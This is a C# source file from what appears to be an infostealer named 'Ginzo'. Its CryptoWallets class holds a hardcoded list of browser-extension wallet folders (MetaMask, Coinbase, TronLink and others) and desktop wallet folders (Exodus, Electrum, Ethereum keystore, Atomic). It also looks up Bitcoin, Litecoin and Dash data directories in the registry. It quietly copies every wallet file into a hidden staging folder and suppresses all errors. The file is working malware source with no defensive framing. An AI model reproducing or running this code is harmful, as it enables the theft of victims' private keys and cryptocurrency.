using System;
using System.IO;
using Microsoft.Win32;
using System.Collections.Generic;

namespace Ginzo
{
    class CryptoWallets
    {
        public static int WalletsCount = 0;

        private static readonly List<string[]> sWalletsDirectories = new List<string[]>
        {
            new string[] { "Tronlink", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\ibnejdfjmmkpcnlpebklmnkoeoihofec" },
            new string[] { "NiftyWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\jbdaocneiiinmjbjlgalhcelgbejmnid" },
            new string[] { "MetaMask", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn" },
            new string[] { "MathWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\afbcbjpbpfadlkmhmclhkeeodmamcflc" },
            new string[] { "Coinbase", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad" },
            new string[] { "BinanceChain", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\fhbohimaelbohpjbbldcngcnapndodjp" },
            new string[] { "BraveWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\odbfpeeihdkbihmopkbjmoonfanlbfcl" },
            new string[] { "GuardaWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\hpglfhgfnhbgpjdenjgmdgoeiappafln" },
            new string[] { "EqualWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\blnieiiffboillknjnepogjhkgnoapac" },
            new string[] { "BitAppWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\fihkakfobkmkjojpchpfgcmhfjnmnfpi" },
            new string[] { "iWallet", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\kncchdigobghenbbaddojjnnaogfppfj" },
            new string[] { "Wombat", Environment.GetEnvironmentVariable("LOCALAPPDATA") + @"\Google\Chrome\User Data\Default\Local Extension Settings\amkmjjmmflddogmhpjloimipbofnfjih" },
            new string[] { "Zcash", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Zcash" },
            new string[] { "Armory", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory" },
            new string[] { "Bytecoin", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin" },
            new string[] { "Jaxx", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb" },
            new string[] { "Exodus", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet" },
            new string[] { "Ethereum", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore" },
            new string[] { "Electrum", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets" },
            new string[] { "AtomicWallet", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic\\Local Storage\\leveldb" },
            new string[] { "Guarda", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda\\Local Storage\\leveldb" },
            new string[] { "Coinomi", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Coinomi\\Coinomi\\wallets" },
        };

        private static readonly string[] sWalletsRegistry = new string[]
        {
            "Litecoin",
            "Dash",
            "Bitcoin"
        };

        public static void GetWallets()
        {
            try
            {
                foreach (string[] wallet in sWalletsDirectories)
                    CopyWalletFromDirectoryTo(wallet[1], wallet[0]);

                foreach (string wallet in sWalletsRegistry)
                    CopyWalletFromRegistry(wallet);
            }
            catch { }
        }

        private static void CopyWalletFromDirectoryTo(string sWalletDir, string sWalletName)
        {
            string cdir = sWalletDir;

            if (Directory.Exists(cdir))
            {
                DirectoryInfo dirInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\Wallets\\" + sWalletName);
                dirInfo.Create();
                FileInfo[] files = new DirectoryInfo(cdir).GetFiles();
                try
                {
                    foreach (FileInfo fileInfo in files)
                    {
                        try
                        {
                            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\Wallets\\" + sWalletName;
                            string filepath = path + $"\\{fileInfo.Name}";
                            File.Copy($"{fileInfo.FullName}", filepath);
                        }
                        catch { }
                    }
                    WalletsCount++;
                }
                catch { }
            }
        }

        private static void CopyWalletFromRegistry(string sWalletRegistry)
        {
            try
            {
                using (var registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey(sWalletRegistry).OpenSubKey($"{sWalletRegistry}-Qt"))
                {
                    if (registryKey != null)
                    {
                        string cdir = registryKey.GetValue("strDataDir").ToString() + "\\wallets";
                        if (Directory.Exists(cdir))
                        {
                            FileInfo[] files = new DirectoryInfo(cdir).GetFiles();
                            foreach (FileInfo fileInfo in files)
                            {
                                try
                                {
                                    string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\GinzoFolder\\Wallets\\" + sWalletRegistry;
                                    string filepath = path + $"\\{fileInfo.Name}";
                                    File.Copy($"{fileInfo.FullName}", filepath);
                                }
                                catch { }
                            }
                        }
                    }
                }
                WalletsCount++;
            }
            catch { }
        }
    }
}
